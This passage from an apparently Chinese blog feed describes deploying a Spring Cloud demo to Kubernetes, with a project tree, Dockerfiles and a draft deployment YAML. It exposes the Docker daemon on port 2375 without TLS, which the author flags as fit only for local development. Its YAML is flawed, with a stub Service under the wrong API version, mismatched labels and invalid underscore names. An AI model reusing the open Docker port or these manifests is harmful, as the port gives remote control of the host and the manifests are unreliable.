class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">C:.</span><br><span class="line">│  pom.xml</span><br><span class="line">│</span><br><span class="line">├─EntryPoint         # 即MailClient</span><br><span class="line">│  │  pom.xml</span><br><span class="line">│  │</span><br><span class="line">│  ├─src</span><br><span class="line">│  │  ├─main</span><br><span class="line">│  │  │  ├─java</span><br><span class="line">│  │  │  │  └─xidian</span><br><span class="line">│  │  │  │      └─lzw</span><br><span class="line">│  │  │  │          └─springcloud</span><br><span class="line">│  │  │  │              └─service</span><br><span class="line">│  │  │  │                  └─entrypoint</span><br><span class="line">│  │  │  │                      │  EntryPointApplication.java</span><br><span class="line">│  │  │  │                      │</span><br><span class="line">│  │  │  │                      ├─client</span><br><span class="line">│  │  │  │                      │      MailClient.java</span><br><span class="line">│  │  │  │                      │</span><br><span class="line">│  │  │  │                      └─controller</span><br><span class="line">│  │  │  │                              MailClientController.java</span><br><span class="line">│  │  │  │</span><br><span class="line">│  │  │  └─resources</span><br><span class="line">│  │  │          application.yml</span><br><span class="line">│</span><br><span class="line">├─Eureka-1# 即Eureka一号</span><br><span class="line">│  │  pom.xml</span><br><span class="line">│  │</span><br><span class="line">│  ├─src</span><br><span class="line">│  │  ├─main</span><br><span class="line">│  │  │  ├─java</span><br><span class="line">│  │  │  │  └─xidian</span><br><span class="line">│  │  │  │      └─lzw</span><br><span class="line">│  │  │  │          └─springcloud</span><br><span class="line">│  │  │  │              └─eureka</span><br><span class="line">│  │  │  │                  └─eureka1</span><br><span class="line">│  │  │  │                          Eureka1Application.java</span><br><span class="line">│  │  │  │</span><br><span class="line">│  │  │  └─resources</span><br><span class="line">│  │  │          application.yml</span><br><span class="line">|</span><br><span class="line">├─Eureka-2# 即Eureka二号</span><br><span class="line">│  │  pom.xml</span><br><span class="line">│  │</span><br><span class="line">│  ├─src</span><br><span class="line">│  │  ├─main</span><br><span class="line">│  │  │  ├─java</span><br><span class="line">│  │  │  │  └─xidian</span><br><span class="line">│  │  │  │      └─lzw</span><br><span class="line">│  │  │  │          └─springcloud</span><br><span class="line">│  │  │  │              └─eureka</span><br><span class="line">│  │  │  │                  └─eureka2</span><br><span class="line">│  │  │  │                          Eureka2Application.java</span><br><span class="line">│  │  │  │</span><br><span class="line">│  │  │  └─resources</span><br><span class="line">│  │  │          application.yml</span><br><span class="line">│</span><br><span class="line">├─MailService# 即邮箱服务</span><br><span class="line">│  │  pom.xml</span><br><span class="line">│  │</span><br><span class="line">│  ├─src</span><br><span class="line">│  │  ├─main</span><br><span class="line">│  │  │  ├─java</span><br><span class="line">│  │  │  │  └─xidian</span><br><span class="line">│  │  │  │      └─lzw</span><br><span class="line">│  │  │  │          └─springcloud</span><br><span class="line">│  │  │  │              └─service</span><br><span class="line">│  │  │  │                  └─mailservice</span><br><span class="line">│  │  │  │                      │  MailServiceApplication.java</span><br><span class="line">│  │  │  │                      │</span><br><span class="line">│  │  │  │                      ├─controller</span><br><span class="line">│  │  │  │                      │      MailController.java</span><br><span class="line">│  │  │  │                      │</span><br><span class="line">│  │  │  │                      └─service</span><br><span class="line">│  │  │  │                          │  MailService.java</span><br><span class="line">│  │  │  │                          │</span><br><span class="line">│  │  │  │                          └─impl</span><br><span class="line">│  │  │  │                                  GMailServiceImpl.java</span><br><span class="line">│  │  │  │</span><br><span class="line">│  │  │  └─resources</span><br><span class="line">│  │  │          application.yml</span><br></pre></td></tr></table></figure><p>这四个组件的关系如下图。本来应该使用一个Zuul网关来统一管理API的，这里换成了使用了OpenFeign的一个接入节点的服务EntryPoint，优点是提供了Ribbon的负载均衡，后续我们只暴露这个容器的端口来供外部访问。</p><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（三）/image-20210810183438958.png"alt="image-20210810183438958" /><figcaption aria-hidden="true">image-20210810183438958</figcaption></figure><p>这里不放代码了，<strong>关于SpringBoot之前有写过IOC和AOP的文章，感兴趣的兄弟可以翻翻。不过确实SpringBoot和SpringCloud的知识确实我没有单独整理过，有空了整整吧，想看的兄弟们给我写个评论就行。</strong></p><h3 id="构建镜像">构建镜像</h3><p>我们分别对这四部分编写Dockerfile，分别如下所示：</p><p><strong>Eureka-1</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> openjdk:<span class="number">8</span>-jdk-alpine3.<span class="number">9</span></span><br><span class="line"><span class="keyword">MAINTAINER</span> lzwgier&lt;float311@<span class="number">163</span>.com&gt;</span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./target/Eureka-1-0.0.1-SNAPSHOT.jar Eureka-1.jar</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;java&quot;</span>, <span class="string">&quot;-jar&quot;</span>, <span class="string">&quot;Eureka-1.jar&quot;</span>, <span class="string">&quot;&amp;&quot;</span>]</span></span><br></pre></td></tr></table></figure><p><strong>Eureka-2</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> openjdk:<span class="number">8</span>-jdk-alpine3.<span class="number">9</span></span><br><span class="line"><span class="keyword">MAINTAINER</span> lzwgier&lt;float311@<span class="number">163</span>.com&gt;</span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./target/Eureka-2-0.0.1-SNAPSHOT.jar Eureka-2.jar</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;java&quot;</span>, <span class="string">&quot;-jar&quot;</span>, <span class="string">&quot;Eureka-2.jar&quot;</span>, <span class="string">&quot;&amp;&quot;</span>]</span></span><br></pre></td></tr></table></figure><p><strong>MailService</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> openjdk:<span class="number">8</span>-jdk-alpine3.<span class="number">9</span></span><br><span class="line"><span class="keyword">MAINTAINER</span> lzwgier&lt;float311@<span class="number">163</span>.com&gt;</span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./target/MailService-0.0.1-SNAPSHOT.jar MailService.jar</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;java&quot;</span>, <span class="string">&quot;-jar&quot;</span>, <span class="string">&quot;MailService.jar&quot;</span>, <span class="string">&quot;&amp;&quot;</span>]</span></span><br></pre></td></tr></table></figure><p><strong>EntryPoint</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> openjdk:<span class="number">8</span>-jdk-alpine3.<span class="number">9</span></span><br><span class="line"><span class="keyword">MAINTAINER</span> lzwgier&lt;float311@<span class="number">163</span>.com&gt;</span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./target/EntryPoint-0.0.1-SNAPSHOT.jar EntryPoint.jar</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;java&quot;</span>, <span class="string">&quot;-jar&quot;</span>, <span class="string">&quot;EntryPoint.jar&quot;</span>, <span class="string">&quot;&amp;&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>当然你可以把这四个jar和Dockerfile扔到服务器一个个build并打tag，这里我方便，就直接通过IDEA直接连接并制作镜像，我们在master节点上开启一下Docker对外的2375端口：</p><ol type="1"><li><code>vim /lib/systemd/system/docker.service</code></li></ol><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（三）/image-20210810165254879.png"alt="image-20210810165254879" /><figcaption aria-hidden="true">image-20210810165254879</figcaption></figure><ol start="2" type="1"><li><p>查看结果，可以看到暴露了2375端口以及可以正常请求到镜像信息了（<strong>这里没有开始TLS，为了安全应该启用，这里只是本地开发</strong>）</p><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（三）/image-20210810165239899.png"alt="image-20210810165239899" /><figcaption aria-hidden="true">image-20210810165239899</figcaption></figure></li></ol><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（三）/image-20210810165444488.png"alt="image-20210810165444488" /><figcaption aria-hidden="true">image-20210810165444488</figcaption></figure><p>在IDEA里进行配置：</p><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（三）/image-20210810165630498.png"alt="image-20210810165630498" /><figcaption aria-hidden="true">image-20210810165630498</figcaption></figure><p>配置每一个应用，这里只展示其中一个，其他同理。<strong>这里我们只构建，不运行（创建容器）</strong></p><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（三）/image-20210810170009706.png"alt="image-20210810170009706" /><figcaption aria-hidden="true">image-20210810170009706</figcaption></figure><p>当然你也可以添加前置任务，比如构建镜像前重新Maven打包一下，这样你就不用手动一个一个去打包了：</p><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（三）/image-20210810170331052.png"alt="image-20210810170331052" /><figcaption aria-hidden="true">image-20210810170331052</figcaption></figure><p>接下来我们就要去构建镜像了，构建之前我有这些镜像：</p><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（三）/image-20210810170514544.png"alt="image-20210810170514544" /><figcaption aria-hidden="true">image-20210810170514544</figcaption></figure><p>构建结束后我们就可以看到镜像了：</p><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（三）/image-20210810173227201.png"alt="image-20210810173227201" /><figcaption aria-hidden="true">image-20210810173227201</figcaption></figure><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（三）/image-20210810173254861.png"alt="image-20210810173254861" /><figcaption aria-hidden="true">image-20210810173254861</figcaption></figure><h3 id="编写资源编排文档">编写资源编排文档</h3><p>接下来就是另一个重头戏了，我们来编写部署这四个服务的yaml。其实是可以写到一个文件里面的，但是为了考虑到横向扩容等形式，这里我们一个一个部署。首先我们部署两个Eureka，我们按部就班来：</p><ol type="1"><li><p>生成yaml：<code>kubectl create deployment eureka_1 --image=spring-cloud-demo/eureka_1 -o yaml --dry-run=client</code></p><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（三）/image-20210810184457882.png"alt="image-20210810184457882" /><figcaption aria-hidden="true">image-20210810184457882</figcaption></figure><p>上面这个文件是一个deployment，我们手动为其添加service的配置，把这俩粘贴到一起：</p><p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">creationTimestamp:</span> <span class="literal">null</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">eureka-1</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">eureka-1</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">1</span><span class="comment"># 这个代表部署数量，或者理解为横向扩容量</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">eureka_1</span></span><br><span class="line">  <span class="attr">strategy:</span> &#123;&#125;</span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">creationTimestamp:</span> <span class="literal">null</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">eureka_1</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">spring-cloud-demo/eureka_1</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">eureka-1-cg9bp</span></span><br><span class="line">        <span class="attr">resources:</span> &#123;&#125;</span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">8080</span><span class="comment"># Eureka_1 监听端口</span></span><br><span class="line"><span class="attr">status:</span> &#123;&#125;</span><br></pre></td></tr></table></figure></p></li></ol><h2 id="section"></h2>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;上一篇主要记录了什么是kubernetes的资源编排yaml文件、如何编写yaml文件，并给了一个Hello-world的demo，当然那个只是展示作用，没啥价值。这篇以一个SpringCloud的项目作为例子，记录一下部署到Kubernetes中的全过程。&lt;/p&gt;
&lt;figure&gt;
&lt;img
src=&quot;/img/Kubernetes-集群环境搭建使用及问题记录（一）/components-of-kubernetes.png&quot;
alt=&quot;image-20210810183438958&quot; /&gt;
&lt;figcaption aria-hidden=&quot;true&quot;&gt;image-20210810183438958&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="开发技术" scheme="https://lzwgiter.github.io/categories/%E5%BC%80%E5%8F%91%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="Kubernete" scheme="https://lzwgiter.github.io/tags/Kubernete/"/>
    
    <category term="分布式技术" scheme="https://lzwgiter.github.io/tags/%E5%88%86%E5%B8%83%E5%BC%8F%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
</feed>
